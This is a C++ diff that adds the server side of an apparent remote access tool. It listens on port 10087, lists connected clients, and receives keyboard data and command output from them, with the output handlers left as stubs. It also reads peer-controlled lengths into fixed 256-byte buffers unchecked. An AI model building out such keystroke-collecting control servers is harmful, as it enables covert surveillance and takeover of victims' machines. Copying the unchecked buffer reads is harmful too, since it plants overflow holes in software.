@@ -7,10 +7,116 @@
 #include "Remote-SERVER.h"
 #include "Remote-SERVERDlg.h"
 #include "afxdialogex.h"
-
+#include"Mysession.h"
+#include"DATA.h"
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #endif
+DWORD WINAPI recvthread(LPVOID lparam)
+{
+	SOCKET* sclient = (SOCKET*)lparam;
+	while (true)
+	{
+
+		int getdate = 0;
+		char rbuf[30] = { 0 };
+		getdate = recv(*sclient, rbuf, sizeof(unsigned int) * 2, 0);
+		DATA* datapacket = (DATA*)rbuf;
+		if (getdate > 0)
+		{
+			if (datapacket->type == CLIENT_KEYBOARD_BACK)
+			{
+				char data[256] = { 0 };
+				recv(*sclient, data, datapacket->length, 0);
+				//输出keyboard数据
+
+			}
+			else if (datapacket->type == CLIENT_CMD_BACK)
+			{
+				char data[256] = { 0 };
+				recv(*sclient, data, datapacket->length, 0);
+				//输出cmd数据
+
+			}
+		}
+		else if (getdate < 0)
+		{
+			//输出xx客户端断开连接
+			break;
+		}
+	}
+	return true;
+}
+
+DWORD WINAPI CRemoteSERVERDlg::acceptthread(LPVOID lparam)
+{
+	sockaddr_in clientaddr = { 0 };
+	clientaddr.sin_family = AF_INET;
+	int addrlen = sizeof(sockaddr_in);
+
+	while (true)
+	{
+		CRemoteSERVERDlg* dlg = (CRemoteSERVERDlg*)lparam;
+
+		SOCKET sclient = accept(dlg->sserver, (sockaddr*)&clientaddr, &addrlen);
+		
+		Mysession* psession = new Mysession;
+		psession->sclient = sclient;
+		memcpy(&(psession->clientaddr), &clientaddr, sizeof(sockaddr_in));
+		psession->clientlasttime = GetTickCount();
+
+
+
+		{
+			std::lock_guard<std::mutex> lg(dlg->accept_mutex);  //对map进行锁存
+			dlg->map_session.insert(std::make_pair(sclient, psession));  //记录每个客户端
+		}
+
+		char ipandport[256] = {0};
+		sprintf_s(ipandport, "%s:%d", inet_ntoa(clientaddr.sin_addr), ntohs(clientaddr.sin_port));
+		dlg->list_client.InsertItem(dlg->map_session.size(), ipandport);
+
+
+
+		//客户端的recv线程
+		CreateThread(0, 0, recvthread, &sclient, 0, 0);
+		
+	}
+}
+
+void CRemoteSERVERDlg::initialization()
+{
+	WORD wVersionRequested;
+	WSADATA wsaData;
+	int err;
+
+	wVersionRequested = MAKEWORD(2, 2);
+
+	err = WSAStartup(wVersionRequested, &wsaData);
+	if (err != 0) {
+		/* Tell the user that we could not find a usable */
+		/* WinSock DLL.                                  */
+		return;
+	}
+
+
+	this->sserver = socket(AF_INET, SOCK_STREAM, 0);
+
+
+	//2.bind/listen
+	//sockaddr addr;
+	sockaddr_in addr;
+	int length = sizeof(sockaddr_in);
+	addr.sin_family = AF_INET;
+	addr.sin_addr.S_un.S_addr = inet_addr("0.0.0.0");
+	addr.sin_port = htons(10087);
+	bind(this->sserver, (sockaddr*)&addr, length);
+
+
+	listen(this->sserver, 5);
+
+	this->hclient = CreateThread(0, 0, acceptthread, this, 0, 0);
+}
 
 
 // 用于应用程序“关于”菜单项的 CAboutDlg 对话框
@@ -33,9 +139,6 @@ protected:
 	DECLARE_MESSAGE_MAP()
 };
 
-CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
-{
-}
 
 void CAboutDlg::DoDataExchange(CDataExchange* pDX)
 {
@@ -59,6 +162,7 @@ CRemoteSERVERDlg::CRemoteSERVERDlg(CWnd* pParent /*=nullptr*/)
 void CRemoteSERVERDlg::DoDataExchange(CDataExchange* pDX)
 {
 	CDialogEx::DoDataExchange(pDX);
+	DDX_Control(pDX, IDC_LIST2, list_client);
 }
 
 BEGIN_MESSAGE_MAP(CRemoteSERVERDlg, CDialogEx)
@@ -100,6 +204,18 @@ BOOL CRemoteSERVERDlg::OnInitDialog()
 	SetIcon(m_hIcon, FALSE);		// 设置小图标
 
 	// TODO: 在此添加额外的初始化代码
+	list_client.InsertColumn(0, "ip:port");
+	list_client.InsertColumn(1, "system");
+	list_client.InsertColumn(2, "information");  //设置展示客户端信息
+
+	list_client.SetColumnWidth(0, 200);
+	list_client.SetColumnWidth(1, 200);
+	list_client.SetColumnWidth(2, 200);			//设置列间距
+
+	list_client.SetExtendedStyle(list_client.GetExtendedStyle() | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);//设置风格
+
+	//服务端套接字初始化并监听
+	initialization();
 
 	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
 }
@@ -108,8 +224,7 @@ void CRemoteSERVERDlg::OnSysCommand(UINT nID, LPARAM lParam)
 {
 	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
 	{
-		CAboutDlg dlgAbout;
-		dlgAbout.DoModal();
+		
 	}
 	else
 	{
